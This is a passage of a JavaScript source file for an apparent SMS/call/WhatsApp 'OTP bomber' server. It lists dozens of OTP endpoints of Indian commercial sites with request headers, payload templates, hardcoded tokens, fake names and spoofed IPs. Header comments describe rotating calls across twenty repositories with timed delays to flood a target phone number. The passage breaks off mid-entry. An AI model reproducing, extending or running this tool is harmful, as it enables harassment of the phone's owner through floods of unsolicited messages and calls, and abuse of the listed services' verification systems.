// ============================================================
// api_server.js - OTP API Server (REPO 1 of 20)
// ALL ~300 APIs | Repo-specific rotation + shuffle
// Minimum 5 sec gap between EACH API call
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ============================================================
// 🔥 REPO CONFIGURATION — SIRF YEH BADLEGA HAR REPO ME
// ============================================================
const REPO_ID = 7;                    // ⭐ Repo 2
const REPO_NAME = `REPO_${REPO_ID}_OF_20`;
const API_DELAY_MS = 5000;            // ⭐ Har API ke baad minimum 5 sec
const MAX_DURATION_MIN = 10;

// ============================================================
// ===== ALL APIS (SAME AS ORIGINAL — ~300 APIs) =====
// ============================================================

const APIS = [
    // ===== SMS APIs =====
    { name: "Astroyogi_V3_SMS", method: "POST", url: "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
      headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 15; RMX3782) AppleWebKit/537.36", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "sec-ch-ua-platform": "Android", "authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg0NDE0ODc0LCJleHAiOjE3OTIxOTA4NzR9.", "origin": "https://www.astroyogi.com", "referer": "https://www.astroyogi.com/registration/login.aspx" },
      data: (phone) => JSON.stringify({ PhoneNumber: phone, PhoneCode: "91", Domain: "Web", CountryId: "IN", IpAddress: "2409:40e4:1143:e495:8000::", CountryCodeByHeader: "IN" }) },
    { name: "SmartCoin_SMS", method: "POST", url: "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
      headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "user_platform": "WEBFLOW", "platform_code": "olyv", "origin": "https://app.olyv.co.in", "referer": "https://app.olyv.co.in/" },
      data: (phone) => JSON.stringify({ phone_number: phone, app_version: "100101", channel: "SMS", request_type: "REGISTRATION", onboarding_consent: true }) },
    { name: "DamieCloud_SMS", method: "GET", url: "https://damiecloud.online/send/{phone}",
      headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36", "Accept": "*/*" } },
    { name: "Refyne_Call", method: "POST", url: "https://prod-api.refyne.co.in/auth/v2/send-otp",
      headers: { "Content-Type": "application/json", "Authorization": "Bearer", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4)" },
      data: (phone) => JSON.stringify({ channel: "IVR", recipient: phone }) },
    { name: "SmartCoin_Call", method: "POST", url: "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
      headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "user_platform": "WEBFLOW", "platform_code": "olyv", "origin": "https://app.olyv.co.in", "referer": "https://app.olyv.co.in/" },
      data: (phone) => JSON.stringify({ phone_number: phone, app_version: "100101", channel: "IVR", request_type: "REGISTRATION", onboarding_consent: true }) },
    { name: "TataCapital_Voice", method: "POST", url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
      headers: { "Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1" },
      data: (phone) => JSON.stringify({ phone: phone, applSource: "", isOtpViaCallAtLogin: "true" }) },
    { name: "Astrosage_Call", method: "GET", url: "https://varta.astrosage.com/sdk/send-otp-via-call?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&operation_name=blank&jsonpcall=1&fromresend=0&_=0",
      headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36", "Accept": "*/*", "X-Requested-With": "pure.lite.browser", "Referer": "http://www.astrosage.com/" } },
    { name: "Breeze_WA", method: "POST", url: "https://api.breeze.in/session/start",
      headers: { "Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8" },
      data: (phone) => JSON.stringify({ phoneNumber: phone, authVerificationType: "otp", device: { id: "A1pKVEDhlv66KLtoYsml3", platform: "Chrome", type: "Desktop" }, countryCode: "+91" }) },
    { name: "GoKwik_WA", method: "POST", url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
      headers: { "accept": "application/json", "content-type": "application/json", "gk-merchant-id": "19g6im8srkz9y" },
      data: (phone) => JSON.stringify({ phone: phone, country: "IN" }) },
    { name: "Redcliffe_WA", method: "POST", url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
      headers: { "accept": "application/json", "content-type": "application/json" },
      data: (phone) => JSON.stringify({ phone_number: phone, short: true, country_code: "+91" }) },
    { name: "Licious_WA", method: "POST", url: "https://www.licious.in/api/login/signup",
      headers: { "Accept": "application/json", "Content-Type": "application/json" },
      data: (phone) => JSON.stringify({ phone: phone, captcha_token: null }) },
    { name: "OYO_WA", method: "POST", url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
      headers: { "Accept": "application/json", "Content-Type": "text/plain;charset=UTF-8", "Cookie": "user_id=none; country_code=IN;" },
      data: (phone) => JSON.stringify({ phone: phone, country_code: "+91", nod: 4 }) },
    { name: "KPNFresh_WA", method: "POST", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
      headers: { "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json" },
      data: (phone) => JSON.stringify({ phone_number: { country_code: "+91", number: phone } }) },
    { name: "AdityaBirla_WA", method: "POST", url: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
      headers: { "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
      data: { "_raw": "MobileNumber={phone}&functionality=signup" } },
    { name: "IIFL_WA", method: "POST", url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
      headers: { "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest" },
      data: { "_raw": "apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1" } },
    { name: "TradeIndia_WA", method: "POST", url: "https://apis.tradeindia.com/app_login_api/login_app",
      headers: { "accept": "application/json", "content-type": "application/json" },
      data: (phone) => JSON.stringify({ mobile: "+91" + phone }) },
    { name: "AstroSage_WA", method: "GET", url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank",
      headers: { "accept": "*/*", "referer": "https://www.astrosage.com/" } },
    { name: "BharatLoan_WA", method: "POST", url: "https://www.bharatloan.com/login-sbm",
      headers: { "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.bharatloan.com", "Referer": "https://www.bharatloan.com/apply-now", "X-Requested-With": "XMLHttpRequest" },
      data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2" } },
    { name: "Pagarbook_WA", method: "POST", url: "https://api.pagarbook.com/api/v5/auth/otp/request",
      headers: { "accept": "application/json", "appversioncode": "5268", "clientplatform": "WEB", "content-type": "application/json", "userrole": "EMPLOYER" },
      data: (phone) => JSON.stringify({ phone: phone, language: 1 }) },
    { name: "55Club_WA", method: "POST", url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
      headers: { "accept": "application/json", "content-type": "application/json;charset=UTF-8", "origin": "https://55club08.in", "referer": "https://55club08.in/" },
      data: (phone) => JSON.stringify({ phone: "91" + phone, codeType: 1, language: 0, random: "35ae48f136d74b279dbd0eeb2504e7f8", signature: "78A2879A0D46B65D257F9B29354B5DBA", timestamp: 1715445820 }) },
    { name: "Zerodha_WA", method: "POST", url: "https://zerodha.com/account/registration.php",
      headers: { "accept": "*/*", "content-type": "application/json" },
      data: (phone) => JSON.stringify({ mobile: phone, source: "zerodha", partner_id: "" }) },
    { name: "Testbook_WA", method: "POST", url: "https://api.testbook.com/api/v2/mobile/signup?mobile={phone}&clientId=1117490662.1715447223",
      headers: { "accept": "application/json", "content-type": "application/json", "x-tb-client": "web,1.2" },
      data: (phone) => JSON.stringify({ firstVisitSource: { type: "organic", utm_source: "google", utm_medium: "organic" }, mobile: phone, signupDetails: { page: "HomePage" } }) },
    { name: "MediBuddy_WA", method: "POST", url: "https://loginprod.medibuddy.in/unified-login/user/register",
      headers: { "accept": "application/json", "content-type": "application/json" },
      data: (phone) => JSON.stringify({ source: "medibuddyInWeb", platform: "medibuddy", phonenumber: phone, flow: "Retail-Login-Home-Flow" }) },
    { name: "Tyreplex_WA", method: "POST", url: "https://www.tyreplex.com/includes/ajax/gfend.php",
      headers: { "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.tyreplex.com", "Referer": "https://www.tyreplex.com/login", "X-Requested-With": "XMLHttpRequest" },
      data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" } },
    { name: "Moglix_WA", method: "POST", url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
      headers: { "accept": "application/json", "content-type": "application/json", "origin": "https://www.moglix.com", "referer": "https://www.moglix.com/" },
      data: (phone) => JSON.stringify({ email: "", phone: phone, type: "p", source: "signup", buildVersion: "DESKTOP-7.3", device: "desktop" }) },
    { name: "Xylem_WA", method: "POST", url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
      headers: { "client-version": "300", "Authorization": "Bearer", "Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "Referer": "https://www.xylem.live/", "randomId": "bfc4e54e-1873-48cc-823e-40d401d9dbb4", "client-id": "64254d66be2a390018e6d348", "client-type": "WEB" },
      data: (phone) => JSON.stringify({ mobile: phone, countryCode: "+91", firstName: "Anant Ambani" }) },
    { name: "Vidyakul_WA", method: "POST", url: "https://vidyakul.com/signup-otp/send",
      headers: { "accept": "application/json, text/javascript, */*; q=0.01", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://vidyakul.com", "referer": "https://vidyakul.com/class-12th/test-series", "x-csrf-token": "el0GIsHQSO3Y4upLoQOm3coVWNEiNtiKJONg2LJx", "x-requested-with": "XMLHttpRequest" },
      data: { "_raw": "phone={phone}" } },
    { name: "Vedantu_WA", method: "POST", url: "https://user.vedantu.com/user/preLoginVerification",
      headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/register" },
      data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, sType: "VEDANTU_F_7_N", sValue: "FC34EE3ED23399CD7622BA1851D3E", token: "5nXaR2BzqApBb3Wf", ver: "1772629389", version: 2, whatsappCommunicationEnabled: false }) },
    { name: "Unacademy_WA", method: "POST", url: "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
      headers: { "accept": "*/*", "content-type": "application/json", "x-platform": "0" },
      data: (phone) => JSON.stringify({ country_code: "IN", phone: phone, is_un_teach_user: false, otp_type: 2.0, send_otp: true, email: "" }) },
    { name: "Myntra_WA", method: "POST", url: "https://www.myntra.com/gateway/v1/auth/getotp",
      headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.myntra.com", "referer": "https://www.myntra.com/login", "deviceid": "8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f", "x-myntraweb": "Yes", "x-requested-with": "browser", "x-location-context": "pincode=276304;source=IP", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" },
      data: (phone) => JSON.stringify({ phoneNumber: phone, signup: "ONECLICK" }) },
    { name: "IndiaMart_WA", method: "POST", url: "https://m.indiamart.com/ajaxrequest/identified/common/login",
      headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://m.indiamart.com", "referer": "https://m.indiamart.com/login/" },
      data: (phone) => JSON.stringify({ GEOIP_COUNTRY_ISO: "IN", IP: "47.9.35.50", IPADDRESS: "47.9.35.50", IP_COUNTRY: "India", ciso: "IN", duplicateEmailCheck: "", glid: "", glusr_usr_ip: "47.9.35.50", originalreferer: "https://m.indiamart.com/login/", pass: "", ph_code: "91", use: phone }) },
    { name: "CityMallWeb_WA", method: "POST", url: "https://citymall.live/web-api/auth/send-otp",
      headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "host": "citymall.live", "origin": "https://citymall.live", "referer": "https://citymall.live/", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" },
      data: (phone) => JSON.stringify({ phone_number: phone }) },
    { name: "Zepto_WA", method: "POST", url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
      headers: { "Content-Type": "application/json", "Accept": "application/json", "Origin": "https://www.zepto.com", "Referer": "https://www.zepto.com/" },
      data: (phone) => JSON.stringify({ mobileNumber: phone, countryCode: "+91" }) },

    // ===== RATE LIMITED =====
    { name: "RL_1mg_SMS", method: "POST", url: "https://www.1mg.com/auth_api/v6/create_token",
      headers: { "Accept": "application/vnd.healthkartplus.v11+json", "Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1" },
      data: (phone) => JSON.stringify({ number: phone, is_corporate_user: false, otp_on_call: false }), rateLimit: true },
    { name: "RL_1mg_Call", method: "POST", url: "https://www.1mg.com/auth_api/v6/create_token",
      headers: { "Accept": "application/vnd.healthkartplus.v11+json", "Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1" },
      data: (phone) => JSON.stringify({ number: phone, is_corporate_user: false, otp_on_call: true }), rateLimit: true },
    { name: "RL_AgriEvolution_WA", method: "POST", url: "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
      headers: { "Content-Type": "application/json" },
      data: (phone) => JSON.stringify({ mobile_number: phone, client_id: "kisan-app" }), rateLimit: true },
    { name: "RL_Freedo_WA", method: "POST", url: "https://api.freedo.rentals/customer/sendOtpForSignUp",
      headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://freedo.rentals", "platform": "web", "referer": "https://freedo.rentals/", "requestfrom": "customer", "x-bn": "2.0.16", "x-channel": "WEB", "x-client-id": "FREEDO", "x-platform": "CUSTOMER" },
      data: (phone) => JSON.stringify({ email_id: "cokiwav528@avastu.com", first_name: "Haiii", mobile_number: phone }), rateLimit: true },
    { name: "RL_Ixigo_WA", method: "POST", url: "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
      headers: { "accept": "*/*", "apikey": "ixiweb!2$", "clientid": "ixiweb", "content-type": "application/x-www-form-urlencoded" },
      data: { "_raw": "sixDigitOTP=true&prefix=%2B91&phone={phone}" }, rateLimit: true },
    { name: "RL_Udaan_WA", method: "POST", url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true",
      headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "origin": "https://auth.udaan.com", "x-app-id": "udaan-auth" },
      data: { "_raw": "mobile={phone}" }, rateLimit: true },

    // ===== OLD RELIABLE =====
    { name: "GetInstaCash", method: "POST", url: "https://getinstacash.in/sell/getData.php",
      headers: { "Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://getinstacash.in", "Referer": "https://getinstacash.in/sell/login" },
      data: { "_raw": "type=sendOTP&mobile={phone}" } },
    { name: "Flipkart_2", method: "GET", url: "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
      headers: { "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "Accept": "*/*", "Referer": "https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={phone}&loginIdentifierPrefix=%2B91&sourceContext=default" } },
    { name: "AakashDigital_2", method: "POST", url: "https://digital.aakash.ac.in/signup-otp-verify",
      headers: { "accept": "*/*", "origin": "https://digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://digital.aakash.ac.in/user/register" },
      data: { "_raw": "&mobileval={phone}" } },
    { name: "RedBus_1", method: "GET", url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
      headers: { "accept": "application/json, text/plain, */*", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "referer": "https://m.redbus.in/preregister" } },
    { name: "Snapdeal", method: "POST", url: "https://m.snapdeal.com/signupCompleteAjax",
      headers: { "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19", "h2": "true", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "accept": "*/*", "origin": "https://m.snapdeal.com", "referer": "https://m.snapdeal.com/signin" },
      data: { "_raw": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy" } },
    { name: "Quikr", method: "POST", url: "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
      headers: { "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept": "*/*", "origin": "https://www.quikr.com", "referer": "https://www.quikr.com/" },
      data: { "_raw": "user={phone}&v3=true" } },
    { name: "Ogonn", method: "POST", url: "https://ogonn.in/otp",
      headers: { "accept": "application/json, text/javascript, */*; q=0.01", "origin": "https://ogonn.in", "x-requested-with": "XMLHttpRequest", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://ogonn.in/login" },
      data: { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" } },
    { name: "AakashDigital_1", method: "POST", url: "https://digital.aakash.ac.in/mkt-signup-otp-verify",
      headers: { "accept": "*/*", "origin": "https://digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://digital.aakash.ac.in/" },
      data: { "_raw": "&mobileval={phone}&otp=6230" } },
    { name: "Flipkart_1", method: "POST", url: "https://1.rome.api.flipkart.com/1/action/view",
      headers: { "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile", "Origin": "https://www.flipkart.com", "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/json", "Accept": "*/*", "Referer": "https://www.flipkart.com/login" },
      data: { actionRequestContext: { type: "LOGIN_IDENTITY_VERIFY", loginIdPrefix: "+91", loginId: "{phone}", clientQueryParamMap: { ret: "/?affid=siteplug", entryPage: "HOMEPAGE_HEADER_ACCOUNT" }, loginType: "MOBILE", verificationType: "OTP", screenName: "LOGIN_V4_MOBILE", sourceContext: "DEFAULT" } } },
    { name: "Netmeds", method: "GET", url: "https://m.netmeds.com/mst/rest/v1/id/details/{phone}",
      headers: { "accept": "application/json, text/plain, */*", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "referer": "https://m.netmeds.com/customer/account/login" } },
    { name: "Vedantu", method: "POST", url: "https://user.vedantu.com/user/preLoginVerification",
      headers: { "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/" },
      data: { email: null, phoneCode: "+91", phoneNumber: "{phone}", ver: "11.345" } },
    { name: "KPN WhatsApp", method: "POST", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
      headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" },
      data: (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } }) },
    { name: "Oyo_1", method: "POST", url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
      headers: { "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "text/plain;charset=UTF-8", "accept": "*/*", "origin": "https://www.oyorooms.com", "referer": "https://www.oyorooms.com/login" },
      data: { phone: "{phone}", country_code: "+91", nod: 4 } },
    { name: "Ullu", method: "POST", url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
      headers: { "accept": "application/json, text/plain, */*", "origin": "https://ullu.app", "referer": "https://ullu.app/" }, data: {} },
    { name: "Hungama OTP", method: "POST", url: "https://communication.api.hungama.com/v1/communication/otp",
      headers: { "Content-Type": "application/json" },
      data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" }) },
    { name: "Gokwik_3", method: "POST", url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
      headers: { "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzNTg0OCwiZXhwIjoxNzU3NDM1OTA4fQ._37TKeyXUxkMEEteU2IIVeSENo8TXaNv32x5rWaJbzA", "Content-Type": "application/json", "gk-merchant-id": "19g6ilhej3mfc" },
      data: (phone) => JSON.stringify({ phone: phone, country: "IN" }) },
    { name: "Gokwik_4", method: "POST", url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
      headers: { "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA", "Content-Type": "application/json", "gk-merchant-id": "19kc37zcdyiu" },
      data: (phone) => JSON.stringify({ phone: phone, country: "IN" }) },
    { name: "Delhivery", method: "GET", url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
      headers: { "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "accept": "*/*" } },
    { name: "Vidyakul", method: "POST", url: "https://vidyakul.com/signup-otp/send",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      data: { "_raw": "phone={phone}&rcsconsent=true" } },
    { name: "ApolloPharmacy", method: "POST", url: "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      data: { "_raw": "mobile={phone}" }, rateLimit: true },
    { name: "Goibibo", method: "POST", url: "https://www.goibibo.com/common/downloadsms/",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      data: { "_raw": "mbl={phone}" }, rateLimit: true },
    { name: "Nuvama", method: "POST", url: "https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO",
      headers: { "Content-Type": "application/json" },
      data: (phone) => JSON.stringify({ contactInfo: phone, mode: "SMS" }), rateLimit: true },
    { name: "Khatabook", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp",
      headers: { "Content-Type": "application/json" },
      data: (phone) => JSON.stringify({ country_code: "+91", phone: phone, app_signature: "Jc/Zu7qNqQ2" }), rateLimit: true },
    { name: "Jockey", method: "GET", url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
      headers: { "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "accept": "*/*" }, rateLimit: true },
    { name: "PharmEasy_NEW", method: "POST", url: "https://pharmeasy.in/api/auth/requestOTP",
      headers: { "Host": "pharmeasy.in", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0", "Accept": "*/*", "Content-Type": "application/json" },
      data: { contactNumber: "{phone}" }, rateLimit: true },
    { name: "JioSaavn", method: "POST", url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0",
      headers: { "Content-Type": "application/json", "Origin": "https://www.jiosaavn.com", "Referer": "https://www.jiosaavn.com/" },
      data: (phone) => JSON.stringify({ phone_number: "+91" + phone }) },
    { name: "Naaptol", method: "POST", url: "https://www.naaptol.com/faces/jsp/ajax/ajax.jsp",
      headers: { "accept": "application/json, text/javascript, */*; q=0.01", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.naaptol.com", "pagesecuritytoken": "DE3NzMzMTY2NTY3NTZfVkBAcHRvbF83MzA1ODUyba", "referer": "https://www.naaptol.com/", "x-requested-with": "XMLHttpRequest" },
      data: (phone) => JSON.stringify({ actionname: "checkMobileUserExistsForTvApp", mobile: phone }) },
    { name: "Factori", method: "POST", url: "https://factori.com/login/check_user_exists",
      headers: { "Content-Type": "application/x-www-form-urlencoded", "origin": "https://factori.com", "referer": "https://factori.com/my-account" },
      data: { "_raw": "mobNumber={phone}&countryCode=91" } },
    { name: "Smytten", method: "POST", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
      headers: { "Content-Type": "application/json" },
      data: (phone) => JSON.stringify({ phone: phone, email: "test@example.com" }) },
    { name: "Tata Capital Business", method: "POST", url: "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
      headers: { "Content-Type": "application/json" },
      data: (phone) => JSON.stringify({ mobileNumber: phone, deviceOs: "Android", sourceName: "MitayeFaasleWebsite" }) },
    { name: "Gokwik", method: "POST", url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
      headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "gk-merchant-id": "19g6im8srkz9y" },
      data: (phone) => JSON.stringify({ phone: phone, country: "IN" }) },
    { name: "AyushmanLoan", method: "POST", url: "https://backend.ayushmanloan.com/api/user/send-otp",
      headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://ayushmanloan.com", "Referer": "https://ayushmanloan.com/" },
      data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }), rateLimit: true },
    { name: "F1SpeedLoan", method: "POST", url: "https://backend.f1speedloan.com/api/user/send-otp",
      headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://f1speedloan.com", "Referer": "https://f1speedloan.com/" },
      data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }), rateLimit: true },
    { name: "RojgarKaro_Signup", method: "POST", url: "https://rojgarkaro.in/api/auth/sendOTPOnSignup",
      headers: { "Content-Type": "application/json", "Origin": "https://rojgarkaro.in", "Referer": "https://rojgarkaro.in/signup" },
      data: (phone) => JSON.stringify({ mobile_no: phone, email_id: "test@gmail.com", isSessionActive: false }), rateLimit: true },
    { name: "Udaan", method: "POST", url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
      headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "origin": "https://auth.udaan.com", "x-app-id": "udaan-auth" },
      data: { "_raw": "mobile={phone}" }, rateLimit: true },
    { name: "PocketCredit", method: "POST", url: "https://pocketcredit.in/api/auth/send-otp",
